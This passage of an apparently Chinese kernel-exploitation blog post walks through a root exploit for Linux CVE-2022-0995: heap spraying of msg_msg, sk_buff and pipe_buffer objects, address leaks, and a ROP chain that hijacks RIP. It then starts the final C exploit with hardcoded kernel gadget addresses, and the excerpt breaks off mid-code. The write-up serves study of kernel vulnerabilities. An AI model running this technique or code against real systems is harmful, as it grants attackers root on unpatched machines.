href="https://github.com/Bonfee/CVE-2022-0995">目前公开的 exp</a> 中对该漏洞的利用其实是基于 <code>__set_bit()</code> 进行利用的，因为相较于不好控制的 filter 溢出，越界写 1 位则更方便我们控制一些指针，例如 <code>msg_msg-&gt;m_list</code> 双向链表</p><p>在这份公开的 exp 中使用的其实是与 CVE-2021-22555 相同的利用技巧，只不过篡改 <code>msg_msg</code> 头部的方式不是邻接溢出写 0，而是越界写 1；接下来笔者将<del>大幅拷贝</del>使用与 CVE-2021-22555 相同的利用技巧完成对该漏洞的利用</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息"><a href="#Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息" class="headerlink" title="Step.I 堆喷 msg_msg ，建立主从消息队列，构造重叠辅助消息"></a>Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列，构造重叠辅助消息</h3><p>现在我们有了一个堆上越界写 1 位，我们该怎么利用呢？比较朴素的一种思想便是覆写一个结构体中的指针，利用 partial overwrite 使得两个这样的结构体的头部指针指向同一个结构体，<strong>从而实现 object overlapping</strong></p><p>那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体，其长度可控，且开头正好是内核双向链表结构体，我们所能覆写的为其 next 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难想到的是，我们可以在一开始时先创建多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 96，第二条消息（辅助消息）的大小为 0x400：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>之后我们读出其中几个消息队列的主消息以产生空洞，再利用 <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> 获取到我们刚释放的 <code>msg_msg</code> 结构体的空间</p><p><img src="https://s2.loli.net/2022/04/06/pql2L98kxRvaZzA.png" alt="image.png"></p><p>这里需要注意的是<strong>我们至少要释放两个主消息，因为在分配到 watch_filter 之前 memdup_user() 还需要获取一个对象</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="keyword">sizeof</span>(*tf));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tf))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(tf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now we need to build the internal filter from only the relevant</span></span><br><span class="line"><span class="comment"> * user-specified filters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);</span><br></pre></td></tr></table></figure><p>对于 <code>__set_bit()</code> 而言其可以置 1 的范围如下图所示，刚好可以覆盖到下一相邻 object 的前 16 字节</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png" alt="image.png"></p><p>利用越界置 1 位我们可以覆写到其相邻的主消息的 next 指针，若该位刚好被由 0 变为 1，则我们很容易构造出<strong>在两个消息队列上存在两个主消息指向同一个辅助消息</strong>的这样的局面</p><p><img src="https://s2.loli.net/2022/04/06/NWHMurcU36EsIAp.png" alt="image.png"></p><p>我们可以通过在主从消息中放置对应的值来标识喷射的不同的消息队列，遍历读取所有队列来感知指向了同一辅助消息的两个队列</p><blockquote><p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-II-释放辅助消息，构造-UAF"><a href="#Step-II-释放辅助消息，构造-UAF" class="headerlink" title="Step.II 释放辅助消息，构造 UAF"></a>Step.II 释放辅助消息，构造 UAF</h3><p>此时我们将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p><p><img src="https://s2.loli.net/2022/04/06/w9RE63dNuVjcmbp.png" alt="image.png"></p><h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址"><a href="#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址" class="headerlink" title="Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址"></a>Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何利用这个 UAF，因为其仍位于消息队列上所以我们考虑伪造 <code>msg_msg</code> 结构体进行后续的利用，这里我们选用另外一个常用来进行堆喷的结构体——<code>sk_buff</code>，类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，</strong>我们不难想到的是<strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p><p>接下来我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p><p><img src="https://s2.loli.net/2022/04/06/QEysxG1YmcUTBAj.png" alt="image.png"></p><p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p><p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p><blockquote><p>通过伪造 msg_msg-&gt;next 可以完成任意地址读，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-IV-堆喷-pipe-buffer，泄露内核基址"><a href="#Step-IV-堆喷-pipe-buffer，泄露内核基址" class="headerlink" title="Step.IV 堆喷 pipe_buffer，泄露内核基址"></a>Step.IV 堆喷 <code>pipe_buffer</code>，泄露内核基址</h3><p>现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权</p><p>之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 <code>pipe_buffer</code> 数组，<strong>既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</strong></p><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址，操作如下：</p><ul><li>利用 <code>sk_buff</code> 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 <code>sk_buff</code> 仍指向该 object</li><li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li></ul><h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权"><a href="#Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权" class="headerlink" title="Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权"></a>Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p><p><img src="https://s2.loli.net/2022/04/06/P8AlaFMCqeSObn2.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>最终的 exp 如下（基本上就是把 CVE-2021-22555 的 exp 里 trigger oob 的函数改一下就能打通了）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/watch_queue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82a63be0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> 